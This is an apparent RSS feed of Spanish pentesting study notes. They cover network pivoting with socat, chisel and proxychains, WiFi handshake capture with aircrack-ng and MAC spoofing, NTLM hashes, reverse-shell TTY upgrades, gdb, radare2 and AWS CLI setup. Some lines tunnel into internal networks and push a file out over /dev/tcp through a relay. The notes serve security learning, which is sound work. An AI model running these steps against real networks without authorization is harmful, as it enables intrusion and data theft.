Copy<br>A nivel de navegador, podríamos hacer uso de herramientas como foxy proxy para configurar un proxy de tipo SOCKS5 y poder así llegar a la máquina, la configuración del mismo debería estar vinculada al localhost por el puerto  indicado (Ej.8899) <br><br>Socat es una binario estático el cual nos servira para redirigir el tráfico. Por ejemplo, dado el caso de un <a data-href="SSRF - (Server-Side Request Forgery)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">SSRF - (Server-Side Request Forgery)</a> u otro caso donde por algun motivo necesitemos desde una Máquina 3 realizar una petición a la Máquina 1, si lo intentamos como normalmente lo haríamos esto no funcionará debido a que no existe conectividad alguna entre ambas, pero sin tener conectividad entre estas habiendo sido vulnerada una Máquina 2, podríamos hacer uso de <a data-tooltip-position="top" aria-label="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" rel="noopener nofollow" class="external-link" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank">socat</a> en esta máquina intermedia para redirigir el tráfico desde una máquina a otra. <br>Es decir aplicar con socat un redireccionamiento desde la Máquina 2 para toda petición entrante por un determinado puerto sea redirigida a un dirección especifica, en este caso, la Máquina 1. <br>./socat TCP-LISTEN:{port},fork TCP:{ip}:{port2}<br><br># Si realizamos lo siguiente no habra conectividad de primeras: 

# Máquina 1 
python3 -m htt.server 80

# Máquina 3 
curl http://{IP_máquina1}/test.txt 

##########################################3

# Si realizamos lo siguiente ahora tendríamos conectividad: 

# Máquina 1
python3 -m http.server 80 

# Máquina 2 
socat TCP-LISTEN:4343,fork TCP:{IP_máquina1}:80

# Máquina 3
curl http://{IP-máquina2}:4343/test.txt 
Copy<br>De esta manera todo el tráfico será constantemente redirigido de un lado al otro para poder tener conexión, siempre se le tiene que enviar traza al nodo más cercano: <br><img alt="enviroment_pivoting_3_machines.png" src="https://dobliuw.com/lib/media/enviroment_pivoting_3_machines.png"><br>En este ejemplo, contamos con la Máquina 1 de IP 192.168.1.38 la cual se encuentra en el mismo segmento de red que la Máquina 2 (192.168.1.33) la cual a su vez tiene un segundo segmento de red (10.10.0.0/24) compartido con una Máquina 3 (10.10.0.129)<br>De manera que si desde la Máquina 1 queremos poder tener traza con la Máquina 3 habría que hacer uso de chisel <br><br>chisel server --reverse -p 1234<br><br>chisel client 192.168.1.38:1234 R:4000:socks<br><br>echo "127.0.0.1 4000" &gt;&gt; /etc/proxychains4.conf<br>
proxychains curl -s -X GET http://10.10.0.129<br>De esta manera haciendo uso de chisel desde la máquian 1 creamos un servidor por el puerto 1234, desde la máquina intermediaria nos conectamos a este servidor fijando en el puerto 4000 de la máquina dueña del servidor de chisel un tunel para el tráfico. De manera que si configuramos las reglas correctamente en el archivo proxychains4.conf indicando el puerto, la máquina 1 tendrá una manera de conectar con la máquina 3 pasando toda la conexión mediante este tráfico. <br>De manera que se podrá conectar mediante ssh, entre otras cosas. <br><br>proxychains ssh root@10.10.0.129<br>Por otro lado, si lo que necesitamos es un "traspaso" de archivos, envíos de reverse shells, etc. Necesitaremos hacer uso de socat, donde una vez más la máquina intermediaria se tendra que ocupar de redirigir todo el tráfico de red entrante por un puerto a una determinada dirección. <br><br>nc -nlvp 443 &gt; binary.txt<br><br> socat TCP-LISTEN:5566,fork TCP:192.168.1.38:443<br><br>cat &lt; binary.txt &gt; /dev/tcp/10.10.0.128/5566<br>De esta manera la máquina 2 se encarga de recibir conexiones por el puerto 5566 y redirigirlo a la IP de la máquina 1 por el puerto 443 donde la máquina 1 se encuentra escuchando. <br><br><br>Ahora, tenemos casos en donde no es un entorno "chico" donde solamente hay 3 máquinas, podría haber 4, 5, 6, etc. En estos casos sigue siendo lo mismo pero con algunos detalles a tener en cuenta. <br>Para hacer uso de chisel será lo mismo, supongamos que tenemos 4 máquinas. <br><img alt="pivoting_4_machines.png" src="https://dobliuw.com/lib/media/pivoting_4_machines.png"><br>Si quisieramos desde la Máquina 1 tener conexión con la máquina 4, deberíamos empezar a jugar con proxy de tipo dynamic_chain en lugar de strict_chain, de manera que esto se configura una vez más en el archivo de configuración /etc/proxychains4.conf.<br>
Es importante tener en cuenta que al final de este archivo de confoguración se indicaran los múltiples tuneles socks5 de manera que primero estaran los últimos y por último el primero. <br>El dinamyc_chain ofrece el mismo funcionamiento que strict. Por lo tanto también seguirá exactamente la lista de proxy que estipulo pero, a diferencia de strict, en el caso que uno de los proxy de la lista falle pasará al siguiente y de este modo podremos establecer la conexión sin problemas.<br>No solo esto, si no que para poder llegar a la Máquina 4, tiene que haber un nuevo "cliente" de chisel corriendo en la máquina 3, pero como la máquina 3 no tiene directamente conectividad con la Máquina 1, habrá que jugar con socat para redirigir la conexión de chisel a nuestro servidor en la Máquina 1. <br><br>chisel server --reverse -p 1234<br><br>chisel client {IP_Máquina1}:1234 R:1080:socks<br>
socat TCP-LISTEN:1234,fork TCP:{IP_Máquina1}:1234<br><br>chisel client {IP_Máquina2}:1234 R:1081:socks<br>De esta manera la máquina 2 funciona como puente hacía la Máquina 1 a la vez que redirige el tráfico ingresad por lo Máquina 3 a la Máquina 1, de manera que conecta  a la Máquina 3 con la Máquina 1 al servidor de chisel por el puerto 1234 indicado. De manera que el archivo de configuración de /etc/proxychains4.conf deberá tener las sigs. líneas: <br><br><br><br><br>A tener en cuenta para los escaneos de nmap y demás, que a partir de que tenemos un dual proxy, la ídea es empezar a jugar con xargs. <br>seq 1 65535 | xargs -p 500 -I {} proxychains nmap -sT -Pn -p{} --open -T5 -v -n {ip} 2&gt;&amp;1 | grep "tcp open"
Copy<br>Y para herramientas como foxy proxy lo mismo, simplemente debemos configurar el nuevo proxy, en el ejemplo dado puerto 1081.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Pivoting/Pivoting.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Aug 2024 15:33:26 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/enviroment_pivoting_3_machines.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/enviroment_pivoting_3_machines.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[0. Hacking WiFi]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a> <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> 
<br><br><br>Para poder llevar a cabo un ataque de WiFi es importante contar con una tarjeta de red. Una tarjeta de red es un componente de hardware que conecta un ordenador a una red y que posibilita compartir recursos en una red de computadoras. <br>
<br>


<br>


<br>El modo monitor es un modo que permite hacer uso de la Tarjeta WiFi en modo de escucha o modo promiscuo de datos. En este modo la tarjeta es capaz de capturar todos los tipos de paquetes tramitados en una red WiFi.<br>Al conectar una tarjeta de red se creara una nueva interfaz, mediante la cual nos podriamos comunicar con la misma<br><br><br>Una interfaz de red es el software que se comunica con el dispositivo que nos brinda internet y la capa IP a fin de proporcionar a la capa IP una interfaz coherente con todos los adaptadores de red que puedan estar presentes.<br># Listar interfacez de red 
ifconfig
# Listar interfacez de red que no esten activas, que esten dadas de bajas, etc.
iwconfig
Copy<br><br><br>Como vimos en <a data-href="Basic Concepts" href="https://dobliuw.com/notes/2.-networks/basic/redes/basic-concepts.html" class="internal-link" target="_self" rel="noopener nofollow">Basic Concepts</a>, las direcciones IP son identificadores númericos para identificar dispositivos en una red.  Es importante agregar que dichas IP pueden ser bien PRIVADAS o PUBLICAS.<br>
<br>

La ip privada es la ip que se asigna dentro del entorno de red local, por lo que si alguien por ejemplo nos lanzase una traza icmp, nuestra maquina no responderia ya que es la ip que utiliza para el segmento de red privada.

<br>

En cambio la ip publica es con la ip que salimos a internet, la cual debemos cuidar para que no sea obtenida por nadie.

<br># Ver mis ips privadas
hostname -I 
# Ver mi ip publica 
curl https://ipinfo.io 
Copy<br><br><br>Concepto tambien explicado en <a data-href="Basic Concepts" href="https://dobliuw.com/notes/2.-networks/basic/redes/basic-concepts.html" class="internal-link" target="_self" rel="noopener nofollow">Basic Concepts</a>, pero en este caso, entrando con lo que es la explotación es importante saber cambiar la dirección MAC ya que es el identificador, por lo que todo tráfico en la red registrara esta dirección MAC nuestra, por lo que es el primer paso necesario para llevar acabo cualquier tipo de ataque. <br># Ver la dirección mac de mi tarjeta de red 
macchanger -s {interfaz}
# Ver los OUI's (Explicado en Conceptos Basicos)
macchanger -l 
# Una vez seleccionado un OUI, solo queda cambiar la MAC haciendo uso de uno y pudiendo modificar el NIC a gusto tambien 
macchanger --mac=FF:FF:FF:FF:FF:FF {interfaz}
Copy<br><br><br>Cuando un dispositivo se conecta a una red WIFi es produce lo que se conoce como handshake entre el AP (Access Point) y el dispositivo. Esto se hacer para verificar que las credenciales que se proporcionan en este momento coincidan entre si, tanto las del AP con las del dispositivo, por lo que las credenciales viajan cifradas por los paquetes en este momento. <br><br><br>
<br>


<br>Como vamos a manipular el modo en el que opera actualmente nuestra interfaz, es necesario suspender la interfaz para realizar los cambios y configuraciones necesarias, en este punto lo quen os intereza es realizar el cambio a modo monitor así tambien como realizar el cambio de la MAC. <br>Para realizar la mayoria de los ataques que más adelante vamos a ver, utilizaremos una Suite de software, que es un paquete de archivos y aplicaciones, llamada Aircrack la cual consiste en un conjunto de herramientas que sirven para hacer funcionar a esta como un analizador de paquetes de redes y auditoria inalámbrica. <br># Suspender una interfaz / Reactivar la interfaz 
ifconfig {interfaz} down / ifconfig {interfaz} up 
# Volver a ver el estado de nuestra interfaz 
iwconfig
# Inicializar el modo monitor con la suite de aircrack / suspender modo monitor
airmon-ng start {interfaz} / airmon-ng stop {interfaz}
Copy<br>Algo importante a remarcar, es que a la hora de inicializar el modo monitor hay que tener en cuenta que ciertos procesos quedan corriendo los cuales podrian traer ciertos problemas en ataques a realizar, por lo que se deben matar dichos procesos (A la hora de inicializar el modo monitor estos procesos salen en el stdout y se recomienda matarlos )<br># Cualquiera de las tres maneras sirven para matar estos procesos (dhclient y wpa_supplicant)
pkill {name_process} &amp;&amp; pkill {name_process}
killall {name_process} {name_process}
airmon-ng check kill 
Copy<br>Y algo a recordar es que cuando paremos el modo monitor se recomienda reiniciar el servicio de networking. Este servicio es un software que permite que el sistema operativo pueda comunicarse con diferentes redes, ya sean cableadas o inalámbricas. Este servicio es responsable de administrar los recursos de red del sistema, como la configuración IP, la configuración de la interfaz de red, el enrutamiento y la resolución de nombres. <br># Opciones de restartear el servicio de networking
/etc/init.d/networking restart 
service networking restart 
Copy<br>
<br>


<br>Para poder iniciar un ataque de red se debe tener un objetivo, pero previo a esto debemos saber ciertas cuestiones como el canal, la essid o el bssid, entre otras cosas de la red para poder dirigir el ataque hacia una sola red. <br>A continuación se listan los valores que seran representados a la hora de dumpear el tráfico de una o varias redes.:<br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>Ejemplo de un dumpeo de red: <br><img alt="dumpeo_de_trafico.png" src="https://dobliuw.com/lib/media/dumpeo_de_trafico.png"><br>Otra cosa importante, es la parte inferior donde se muestra STATION, hace referencia a los dispositivos que se logran analizar junto a la red que estan conectados (BSSID). <br>Ahora si, toca dumpear el tráfico de la red y posteriormente comenzar a filtrar por canales, bssid, essid, etc. y para realizar dichas acciones tenemos varios comandos: <br># Dumpear todo el tráfico de red.
airodump-ng {interfaz}
# Dumpear todo el tráfico de red para un canal. 
airodump-ng -c {channel} {interfaz}
# Dumpear todo el tráfico de red para una red en particular
airodump-ng -c {channel} --essid {essid} {interfaz}
airodump-ng -c {channel} --bssid {bssid} {interfaz}
Copy<br>Ahora bien, para hackear una red inalambrica, necesitamos ir guardando todo el tráfico en un archivo para poder capturar la contraseña ya que esta no va a estar en texto claro, si no, cifrada con el CIPHER que tenga, posteriormente necesitariamos extraer el hash de la clave cifrada para aplicar fuerza bruta, por lo tanto,  para capturar dicho tráfico en un archivo se utiliza el sig. comando: <br># Escaneando una red en particular haciendo uso del essi o bssid, necesitamos agregar el -w para dumpear todo el trafico en un arhcivo.
ariodump-ng -c {channel} --essid/--bssid {essid/bssid} -w {file_name} {interfaz}
Copy<br><br><br>Es importante entender, que el objetivo de todos los ataques termian siendo conseguir el handshake, para realizar esto existen varios tipos de ataques. <br>Flujo de conexión habitual <a data-href="WiFiConnections_draw" href="https://dobliuw.com/notes/2.-networks/basic/wificonnections_draw.html" class="internal-link" target="_self" rel="noopener nofollow">WiFiConnections_draw</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/0. Hacking WiFi.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 02:08:55 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/dumpeo_de_trafico.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/dumpeo_de_trafico.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Filtros de paquetes]]></title><description><![CDATA[ 
 <br><br>
<br>RTS: Paquetes que se tramitan para verificar si el nodo esta apto para recibir datos. 
<br>CTS: Paquetes que se tramitan para confirmarle al nodo emisor que el nodo receptor esta  apto para recibir datos, es la respuesta del RTS. 
<br>PROBE REQUEST: Paquetes que se tramitan para intentar volver a conectar a la red un dispositivo que fue desconectado y ver si el AP contesta. 
<br>PROBE RESPONSE: Paquetes que se tramitan desde el AP en contestación del probe response.
<br>ASSOCIATION REQUEST: Paquetes que se tramitan para intentar asociarse al AP.
<br>ASSOCIATON APROBE: Paquetes que se tramitan en respuesta del intento de asociamiento, es decir del association request. 
<br>BEACON: Paquetes que se tramitan indicando el canal y la información del AP. 
<br>AUTENTICATION: Paquetes que se tramitan posteriormente a la asociación (association aprobe), por lo que se intenta la autenticación. 
<br>DEAUTENTICATION: Paquetes que se tramitan para deautenticarse. 
<br>DESASOCITION: Paquetes que se tramian una vez que la deautenticación es exitosa (deautentication) para desasociar el dispositivo. 
<br>Info

<br>



<br>



<br>



<br>



<br>



<br>



<br>



<br>



<br>



<br>




]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/1.-filtering-packages.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/1. Filtering Packages.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 31 Oct 2024 17:06:10 GMT</pubDate></item><item><title><![CDATA[Hashes NT, NTLM y NTLMv2]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:AD" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#AD</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:AD" class="tag" target="_blank" rel="noopener nofollow">#AD</a>
<br><br><br>Este término se utiliza para describir el hash derivado de la contraseña de un usuario en un entorno de Windows. Se deriva utilizando una función de resumen criptográfico, generalmetne el algoritmo MD4 (Message Digest 4). El hash NT es la representación hash irreversible de la contraseña del usuario en forma de una cadena hexadecimal.<br>
Este hash puede ser utilizado para realizar un Pass The Hash tanto como para intentar crackearlo, ya que es el hash original al cual fue convertida la contraseña en texto claro.<br><br><br>NTLM es un protocolo de autenticación utilizado en entornos de Windows que utiliza el Hash NT como parte del proceso de autenticación. A menudo, el término NTLM se usa para referirse al proceso de autenticación en sí, que implica la presentación y verificación del Hash NT del usuario. El protoclo NTLM ha sido ampliamente utilizado en versiones anteriores de Windows, aunque ha sido reemplazado en gran medida por el protocolo <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a> en entornos más modernos.<br><br><br>NTLMv2 es una versión mejorada y más segura del protocolo NTLM. A menudo, el término NTLMv2 se utiliza para referirse al protocolo de autenticación que incluye mejoras de seguridad, como la inclusión del salt en el proceso de hash, lo que hace que sea más resistente a ataques de fuerza bruta y de raimbowtables. NTLMv2 también utiliza un algoritmo de derivación de clave más seguro, lo que lo vuelve preferible y más seguro que NTLM.<br>
Por otro lado, el hash NTLMv2 es el hash que se genera en cada autenticación cliente/servidor, por lo que no es un hash que se almacene, sino que dependerá de cada comunicación. <br>Este hash puede ser utilizado para intentar crackearlo.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/1.-basic/hashes-nt,-ntlm-y-ntlmv2.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/1. Basic/Hashes NT, NTLM y NTLMv2.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 25 Jun 2024 21:15:11 GMT</pubDate></item><item><title><![CDATA[TTY]]></title><description><![CDATA[ 
 <br><br>En sistemas Unix y Unix-like, TTY (teletyperwriter) se refiere a cualquier terminal que proporciona una interfaz de usuario para interactuar con el sistema operativo. Se refiere principalmente a terminales virtuales que permiten la interacción con el sistema operativo.<br>Cuando hablamos del tratamiento a la tty en un contexto de pentesting, nos referimos a mejorar la manipulación y control de la terminal. Cuando obtenemos una <a data-href="Shells#Reverse Shell" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html#Reverse_Shell" class="internal-link" target="_self" rel="noopener nofollow">Shells &gt; Reverse Shell</a> o una <a data-href="Shells#Bind Shell" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html#Bind_Shell" class="internal-link" target="_self" rel="noopener nofollow">Shells &gt; Bind Shell</a>, es común encontrarnos con que estas se encuentran limitadas. Esto significa que ciertas funcionalidades de la terminal no están disponbles, como el uso de las teclas de flechas para editar comandos, el autocompletado, la ejecución de ciertos comandos interactivos y el manejo adecuado de señales como ctrl c. <br>Para obtener una terminal completa con las funcionalidades mejoradas, es necesario elevar la shell básica obtenida a una pseudo-terminal (PTY). Aca es donde entra el juego el tratamiento de la TTY:<br><br>Utilizamos el comando script para iniciar una nueva sesión de terminal (bash) sin grabar nada (redirigiendo la salida al /dev/null).<br>script /dev/null -c bash
Copy<br>Luego, presionamos la combinación de teclas ctrl + z para envíar la señal SIGTSTP al proceso en primer plano, suspendiéndolo temporalmente y devolviéndonos a la shell original de nuestro sistema.<br>Proseguimos con la ejecución del comando  stty para configurar el terminal en modo raw y desactivar el eco para posteriormente renaudar el proceso previamente suspendido:<br>stty raw -echo; fg
Copy<br>Con este comando, el terminal pasa a modo raw, donde el input se envía directamente al programa sin procesamiento (Sin interpretacinoes como EOF o señales) junto con la desactivación de el eco, por lo que las teclas presionadas no se muestran en la pantalla.<br>Tras la ejecución de estos comandos, veremos que se nos "buguea" la consola, donde en caso de escribir veremos que escribimos en el aire, de igual manera deberemos teclear el comando: <br>reset xterm
Copy<br>Para limpiar el terminal y reconfigurar parámetros, asegurando que esté en un estado funcional adecuado junto con la configuración específica de xterm, que es un emulador de terminal común con diversas capacidades.<br>En este punto casi tendríamos una TTY 100% interactiva, pero algunas funcionalidades como el ctrl + c en este punto podrían seguir sin funcionar, aunque en caso de que funcione podríamos notar que al presionar esta combinación no perdemos la conexión, simplemente habría que retocar las variables de entorno $SHELL y $TERM, junto con ajustar las proporciones de la TTY en caso de ser necesario:<br>export SHELL=bash
export TERM=xterm
Copy<br>En este punto, para ajustar el tamaño de nuestra terminal de maner correcta en lo que a filas y columnas respecta, podríamos hacer uso del comando stty para visualizar nuestras proporciones (filas y columnas) utilizadas en una terminal de nuestro gusto:<br>stty -a
Copy<br>Una vez habiendo detectado las filas y columnas utilizadas, finalmente configuraremos estas proporciones a nuestra TTY, dandonos como resultado una TTY 100% interactiva como la que podríamos usar diariamente en nuestro sistema:<br>stty rows {rows_num} columns {columns_num}
Copy<br><br>En este caso, podríamos optar por hacer uso de python para obtener una TTY interactiva y redirigiendo la entrada y salida al /dev/null:<br>python3 -c 'import pty; pyt.spwan("/bin/bash")' 2&gt;&amp;1 | tee /dev/null
Copy<br>Posteriormente, proseguiremos con suspender el proceso y configurar la terminal en modo raw y sin eco, nuevamente presionamos ctrl + z y ejecutamos el comando: <br>stty raw -echo; fg
Copy<br>Luego de esto, simplemente restará ejecutar el comando reset para resetear la terminal y realizar las configuraciones de variables de entorno y de proporciones vistas en la Opción 1:<br>export TERM=xterm
export SHELL=bash
stty rows {rows_num} columns {columns_num}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/1.-basic/tty-treatment.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/1. Basic/TTY Treatment.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 25 Jun 2024 21:39:28 GMT</pubDate></item><item><title><![CDATA[Gdb]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> 
<br><br><br>GDB es una herramienta de depuración y anpalisis de código abierto ampliamente utilizada. Puede instalarse en sistemas Unix-like a tavés de gestores de paquetes. sudo apt-get install gdb.<br><br><br>Un caso de uso puede ser para explotar un <a data-href="Buffer Overflow x86 linux" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow-escenarios/buffer-overflow-x86-linux.html" class="internal-link" target="_self" rel="noopener nofollow">Buffer Overflow x86 linux</a> en donde podríamos hacer uso de gdb para calcular el offset, consultar las protecciones, listar funciones, etc. <br># Ejecutamos el binario con el debugger gdb en modo "quiet"
gdb {binary} -q 
# Verificar protecciones
checksec 
# Listar funciones del binario
info functions
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/binarys/gdb.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Binarys/Gdb.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:16:06 GMT</pubDate></item><item><title><![CDATA[Radare2]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> 
<br><br><br>Radare2 es una suite completa para el análisis de binarios. Ofrece una interfaz de línea de comandso con múltiples comandos para realizar diversas tareas, como desmontar código, buscar patrones, analizar flujos de control y mucho más. Radare2 es altamente configurable y se puede utilizar tnato en tareas e análisis estático como dinámico.<br><br><br>Para comenzar a analisar un binario este deberíamos abrirlo con la herramienta. (<a data-tooltip-position="top" aria-label="https://book.rada.re/first_steps/getting_radare.html" rel="noopener nofollow" class="external-link" href="https://book.rada.re/first_steps/getting_radare.html" target="_blank">Instalación</a>)<br>radare2 {binary_to_analyze}
Copy<br>Una vez abierto, podríamos ver la <a data-tooltip-position="top" aria-label="https://book.rada.re/first_steps/commandline_flags.html" rel="noopener nofollow" class="external-link" href="https://book.rada.re/first_steps/commandline_flags.html" target="_blank">documentación</a> para saber los comandos habituales, o incluso hace uso de la flag -h. <br>radare2 -h
Copy<br>Podríamos comenzar a analizar el código haciendo uso del comando aaa para indicar que queremos analizar TODO el código.<br>aaa
# Analizar todo el código
afl
# Listar las funciones existentes
pdf @{function_name}
# Listar a bajo nivel lo que existe en una determinada función
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/binarys/radare2.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Binarys/Radare2.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:41 GMT</pubDate></item><item><title><![CDATA[Amazon Web Service Enumeration]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> 
<br><br><br>Amazon Web Service (AWS) es la nube más adopata y completa en el mundo. Los servicios de AWS ofrecen soluciones escalables para la computación, el almacenamiento, las bases de datos, el análisis y mucho más. <br><br><br>Muchas veces de cara a una auditoría puede ser que nos encontremos con servicios de AWS, en el mejor de los casos podríamos llegar a dar con la Access Key ID, la Secret Access Key y la region. En caso de contar con dichas configuraciones, podríamos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html" rel="noopener nofollow" class="external-link" href="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html" target="_blank">AWS CLI</a> y configurar estos valores para posteriormente realizar llamadas al servidor de AWS.<br><br>curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
